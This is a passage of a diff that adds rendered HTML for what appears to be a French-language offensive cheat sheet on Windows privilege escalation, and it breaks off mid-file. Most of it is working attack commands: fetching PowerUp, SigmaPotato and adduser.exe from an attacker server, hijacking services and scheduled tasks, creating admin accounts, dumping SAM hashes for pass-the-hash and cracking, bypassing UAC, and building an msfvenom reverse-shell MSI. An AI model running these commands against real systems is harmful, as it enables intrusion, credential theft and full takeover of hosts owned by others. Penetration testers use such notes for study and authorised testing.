+<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Outfile</span> <span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="p">.</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="nb">Find-ProcessDLLHijack</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</code></pre></div>
+<h3 id="unquoted-service-paths">Unquoted Service Paths</h3>
+<p>Si un chemin de service contient des espaces sans guillemets, Windows interprète chaque espace comme une fin de nom de fichier possible. Ex : <code>C:\Program Files\My App\service.exe</code> → Windows essaie <code>C:\Program.exe</code>, puis <code>C:\Program Files\My.exe</code>, etc. Si on peut écrire dans un de ces répertoires, on y place un binaire malveillant avec le nom attendu.</p>
+<h4 id="manuel_2">Manuel</h4>
+<p><strong>Lister les services avec des espaces et sans guillemets</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">StartMode</span><span class="p">,</span> <span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-notmatch</span> <span class="s1">'"'</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-notmatch</span> <span class="s1">'C:\\Windows'</span><span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+</code></pre></div>
+<p><strong>Vérifier les permissions d'écriture sur les répertoires du chemin</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>icacls "C:\Program Files\Enterprise Apps"
+</code></pre></div>
+<p><strong>Placer le binaire malveillant et démarrer le service</strong></p>
+<p>Le service peut retourner une erreur mais le binaire est quand même exécuté.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">adduser</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">Current</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="nb">copy </span><span class="p">.\</span><span class="n">Current</span><span class="p">.</span><span class="n">exe</span> <span class="s1">'C:\Program Files\Enterprise Apps\Current.exe'</span>
+<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="n">net</span> <span class="nb">start </span><span class="n">GammaService</span>
+</code></pre></div>
+<p><strong>Vérifier que l'exploitation a fonctionné</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>net user
+<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>net localgroup administrators
+</code></pre></div>
+<h4 id="powerup_2">PowerUp</h4>
+<p>Crée un user <code>john</code> / <code>Password123!</code> ajouté aux admins locaux par défaut.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Kali</span>
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>cp<span class="w"> </span>/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1<span class="w"> </span>.
+<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Outfile</span> <span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+<a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="p">.</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="nb">Get-UnquotedService</span>
+<a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="nb">Write-ServiceBinary</span> <span class="n">-Name</span> <span class="s1">'GammaService'</span> <span class="n">-Path</span> <span class="s2">"C:\Program Files\Enterprise Apps\Current.exe"</span>
+<a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="n">net</span> <span class="n">stop</span> <span class="n">GammaService</span>
+<a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="n">net</span> <span class="nb">start </span><span class="n">GammaService</span>
+</code></pre></div>
+<p><strong>Vérifier que l'exploitation a fonctionné</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>net user
+<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>net localgroup administrators
+</code></pre></div>
+<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+<p>Points clés à identifier sur une tâche planifiée :
+- <strong>Principal</strong> : sous quel compte tourne la tâche (SYSTEM, admin ?)
+- <strong>Trigger</strong> : la condition d'exécution est-elle encore à venir ?
+- <strong>Action</strong> : quel binaire/script est exécuté, et peut-on le remplacer ?</p>
+<p><strong>Lister les tâches planifiées</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">URI</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">"RunAs"</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">UserId</span><span class="p">}},</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">"Execute"</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Actions</span><span class="p">.</span><span class="n">Execute</span><span class="p">}}</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">URI</span> <span class="o">-notlike</span> <span class="s2">"\Microsoft\Windows\*"</span><span class="p">}</span>
+<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>
+<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">URI</span><span class="p">,</span> <span class="n">Author</span><span class="p">,</span> <span class="n">Description</span>
+<a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>
+<a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">URI</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">"RunAs"</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">UserId</span><span class="p">}},</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">"Execute"</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Actions</span><span class="p">.</span><span class="n">Execute</span><span class="p">}}</span>
+<a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>
+<a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">URI</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">"Execute"</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Actions</span><span class="p">.</span><span class="n">Execute</span><span class="p">}},</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">"Arguments"</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Actions</span><span class="p">.</span><span class="n">Arguments</span><span class="p">}}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>schtasks /query /fo LIST /v
+<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>
+<a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>schtasks /query /fo LIST /v | Select-String -Pattern "\.exe" -Context 5,0
+<a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>
+<a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>schtasks /query /fo LIST /v /tn "URIDeLaTache"
+</code></pre></div>
+<p><strong>Vérifier les permissions sur le binaire de la tâche</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+</code></pre></div>
+<p><strong>Remplacer le binaire et attendre l'exécution</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nb">iwr </span><span class="n">-Uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">adduser</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">BackendCacheCleanup</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="nb">move </span><span class="p">.\</span><span class="n">Pictures</span><span class="p">\</span><span class="n">BackendCacheCleanup</span><span class="p">.</span><span class="n">exe</span> <span class="n">BackendCacheCleanup</span><span class="p">.</span><span class="n">exe</span><span class="p">.</span><span class="n">bak</span>
+<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="nb">move </span><span class="p">.\</span><span class="n">BackendCacheCleanup</span><span class="p">.</span><span class="n">exe</span> <span class="p">.\</span><span class="n">Pictures</span><span class="p">\</span>
+</code></pre></div>
+<p><strong>Vérifier que l'exploitation a fonctionné</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>net user
+<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>net localgroup administrators
+</code></pre></div>
+<h2 id="kernel-exploits">Kernel Exploits</h2>
+<p><strong>Enumérer la version Windows et les patches de sécurité installés</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>systeminfo
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="nb">Get-CimInstance</span> <span class="n">-Class</span> <span class="n">win32_quickfixengineering</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Description</span> <span class="o">-eq</span> <span class="s2">"Security Update"</span> <span class="p">}</span>
+</code></pre></div>
+<p>Chercher des CVE sur Google pour le build identifié, ou utiliser <a href="https://github.com/bitsadmin/wesng">wesng</a> pour automatiser la recherche.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a># Cible : exporter systeminfo
+<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>systeminfo &gt; C:\Users\Public\sysinfo.txt
+</code></pre></div>
+<p>Récupérer <code>sysinfo.txt</code> sur Kali et le passer à wesng. Les résultats avec <code>--exploits-only</code> indiquent des CVE avec un exploit public disponible.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="c1"># Kali</span>
+<a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/bitsadmin/wesng
+<a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a><span class="nb">cd</span><span class="w"> </span>wesng
+<a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>python<span class="w"> </span>wes.py<span class="w"> </span>--update
+<a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>python<span class="w"> </span>wes.py<span class="w"> </span>sysinfo.txt<span class="w"> </span>-i<span class="w"> </span><span class="s2">"Elevation of Privilege"</span><span class="w"> </span>--exploits-only
+</code></pre></div>
+<p><strong>Exécuter l'exploit</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>.\CVE-2023-29360.exe
+<a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>whoami
+</code></pre></div>
+<p>Les kernel exploits peuvent crasher le système - tester sur un clone avant.</p>
+<h2 id="seimpersonateprivilege">SeImpersonatePrivilege</h2>
+<h4 id="theorie">Théorie</h4>
+<p>Permet à un service de traiter une requête avec les droits du client qui s'y connecte, plutôt qu'avec ses propres droits (moindre privilège). Souvent présent sur les comptes de service IIS (LocalService, NetworkService, ApplicationPoolIdentity).
+<strong>Workflow légitime :</strong>
+1. Client s'authentifie auprès d'un service (ex: MSSQL, IIS).
+2. LSASS crée un token pour ce client, attaché au thread du service.
+3. Le service appelle <code>ImpersonateLoggedOnUser</code> sur ce token.
+4. Les opérations du thread s'exécutent avec les droits du client.
+5. <code>RevertToSelf</code> une fois terminé.</p>
+<p><strong>Le détournement offensif</strong>
+SeImpersonatePrivilege n'autorise à impersonate <strong>que</strong> ce qui est présenté (authentification entrante), jamais un token pioché dans un autre process (ça nécessite SeDebugPrivilege, absent ici).
+<strong>Principe des Potatoes :</strong> forcer un composant SYSTEM local à s'authentifier vers un listener contrôlé par l'attaquant (coerce), pour capturer ce token SYSTEM.</p>
+<p><strong>Famille COM/DCOM - RottenPotato / JuicyPotato / GodPotato</strong>
+1. Attaquant instancie un objet COM (CLSID d'un service SYSTEM, ex: BITS).
+2. Le DCOM Service Control Manager (SYSTEM) doit résoudre l'OXID de cet objet.
+3. Attaquant monte un faux OXID resolver local.
+4. DCOMLaunch (SYSTEM) s'authentifie NTLM auprès de ce faux resolver.
+5. Token SYSTEM capturé → impersonation.
+Évolutions : JuicyPotato (choix du CLSID/port), RoguePotato (contourne le blocage loopback post-patch), GodPotato (adapté aux OS récents).</p>
+<p><strong>Famille Spouleur - PrintSpoofer</strong>
+Exploite <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code> (MS-RPRN), normalement destinée à notifier un abonné d'événements d'impression.
+1. Attaquant crée un named pipe local.
+2. Appelle la fonction RPC en indiquant ce pipe comme destination des notifications.
+3. Spouleur (SYSTEM) se connecte à ce pipe → authentification NTLM.
+4. Attaquant capture via <code>ImpersonateNamedPipeClient</code>.
+5. Token SYSTEM obtenu → impersonation.</p>
+<p><strong>Finalisation commune</strong>
+<code>DuplicateToken</code> (impersonation → primaire) puis <code>CreateProcessAsUser</code> pour lancer un process en tant que SYSTEM.</p>
+<h4 id="pratique">Pratique</h4>
+<p><strong>Vérifier le privilege</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>whoami /priv
+<a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>
+<a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>PRIVILEGES INFORMATION
+<a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>----------------------
+<a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>
+<a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>Privilege Name                Description                               State   
+<a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>============================= ========================================= ========
+<a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</code></pre></div></p>
+<p><strong>Télécharger SigmaPotato et exécuter des commandes en SYSTEM</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="c1"># Kali : télécharger et servir</span>
+<a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>wget<span class="w"> </span>https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+<a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">SigmaPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">SigmaPotato</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>
+<a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="p">.\</span><span class="n">SigmaPotato</span><span class="p">.</span><span class="n">exe</span> <span class="s2">"net user johndoe Password123! /add"</span>
+<a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="p">.\</span><span class="n">SigmaPotato</span><span class="p">.</span><span class="n">exe</span> <span class="s2">"cmd /c net user johndoe Password123! /add"</span>
+<a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>
+<a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="p">.\</span><span class="n">SigmaPotato</span><span class="p">.</span><span class="n">exe</span> <span class="s2">"net localgroup Administrators johndoe /add"</span>
+<a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="p">.\</span><span class="n">SigmaPotato</span><span class="p">.</span><span class="n">exe</span> <span class="s2">"cmd /c net localgroup Administrators johndoe /add"</span>
+</code></pre></div>
+<p>Principe : forcer un processus SYSTEM à s'authentifier sur un named pipe contrôlé, capturer le token, l'impersonate.</p>
+<p>Prérequis : <code>SeImpersonatePrivilege</code> ou <code>SeAssignPrimaryTokenPrivilege</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Outil</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/breenmachine/RottenPotatoNG">RottenPotato</a></td>
+<td>Le premier, exploite DCOM + NTLM relay local. Obsolète, patché.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a></td>
+<td>Amélioration de Rotten, choix du CLSID DCOM. Patché sur Windows 10 1809+ / Server 2019+.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a></td>
+<td>Exploite le Spooler via named pipe, fonctionne là où JuicyPotato échoue.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/CCob/SweetPotato">SweetPotato</a></td>
+<td>Combine JuicyPotato + PrintSpoofer, plus polyvalent.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/BeichenDream/GodPotato">GodPotato</a></td>
+<td>Exploite IRemUnknown2 via DCOM, fonctionne sur Windows 2012-2022. Le plus fiable actuellement.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe">SigmaPotato</a></td>
+<td>Variante moderne, simple d'utilisation.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/wh0amitz/PetitPotato">PetitPotato</a></td>
+<td>+ Moderne</td>
+</tr>
+<tr>
+<td>## Backup Operator</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Le groupe <code>Backup Operators</code> confère <code>SeBackupPrivilege</code> et <code>SeRestorePrivilege</code>, permettant de lire/écrire n'importe quel fichier en bypassant les ACLs - y compris les ruches de registre contenant les hashes locaux.</p>
+<p><strong>Vérifier la membership et les privilèges</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>whoami /groups
+<a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>whoami /priv
+</code></pre></div>
+<p><strong>Sauvegarder les ruches SAM et SYSTEM</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>mkdir C:\temp
+<a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>reg save HKLM\SAM C:\temp\SAM
+<a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>reg save HKLM\SYSTEM C:\temp\SYSTEM
+</code></pre></div>
+<p><strong>Extraire les hashes</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="c1"># Transférer les fichiers sur Kali puis dump les hashs</span>
+<a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>impacket-secretsdump<span class="w"> </span>-sam<span class="w"> </span>SAM<span class="w"> </span>-system<span class="w"> </span>SYSTEM<span class="w"> </span>LOCAL
+</code></pre></div>
+<p><strong>Pass-the-Hash</strong> - s'authentifier sans connaître le mot de passe en clair :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLMhash<span class="w"> </span>administrator@&lt;IP&gt;
+<a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-H<span class="w"> </span>NTLMhash
+</code></pre></div>
+<p><strong>Crack offline</strong> avec hashcat :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<h2 id="lolbas">LOLBAS</h2>
+<p><a href="https://lolbas-project.github.io">LOLBAS</a></p>
+<h2 id="trouver-des-creds">Trouver des Creds</h2>
+<ul>
+<li><strong>PowerShell history</strong> : <code>C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><strong>Registry AutoLogon</strong> : <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></li>
+<li><strong>Saved RDP connections</strong> : <code>HKCU\Software\Microsoft\Terminal Server Client\Servers</code></li>
+<li><strong>MSSQL credentials</strong> : Si SQL Server tourne, se connecter et chercher une table creds</li>
+<li>https://github.com/AlessandroZ/LaZagne</li>
+<li><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a></li>
+</ul>
+<h2 id="create-admin-account-bypass-uac">Create Admin Account + Bypass UAC</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>net user johndoe Password123! /add
+<a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>net localgroup administrators johndoe /add
+<a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>net localgroup "Remote Management Users" johndoe /add
+<a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>
+<a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+</code></pre></div>
+<h2 id="windowsold">Windows.old</h2>
+<p>Downloaded SAM, SYSTEM files</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>*Evil-WinRM* PS C:\windows.old\Windows\System32&gt; download SAM
+<a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>*Evil-WinRM* PS C:\windows.old\Windows\System32&gt; download SYSTEM
+<a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>
+<a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+</code></pre></div>
+<h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2>
+<p><strong>Détection</strong>
+Vérifier les deux clés de registre :
+<div class="highlight"><pre><span></span><code><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="nb">Get-ItemProperty</span> <span class="n">HKCU</span><span class="p">:\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
+<a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="nb">Get-ItemProperty</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
+</code></pre></div>
+<p>Les deux doivent retourner <code>0x1</code> pour que la vulnérabilité soit exploitable.</p>
+<p><strong>Exploitation via RevShell</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>msi<span class="w"> </span>-o<span class="w"> </span>evil.msi
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>msiexec /quiet /qn /i evil.msi
+</code></pre></div>
+<p><strong>Exploitation via adduser</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>wixl
+</code></pre></div>
+<p><strong>adduser.wxs</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="cp">&lt;?xml version="1.0"?&gt;</span>
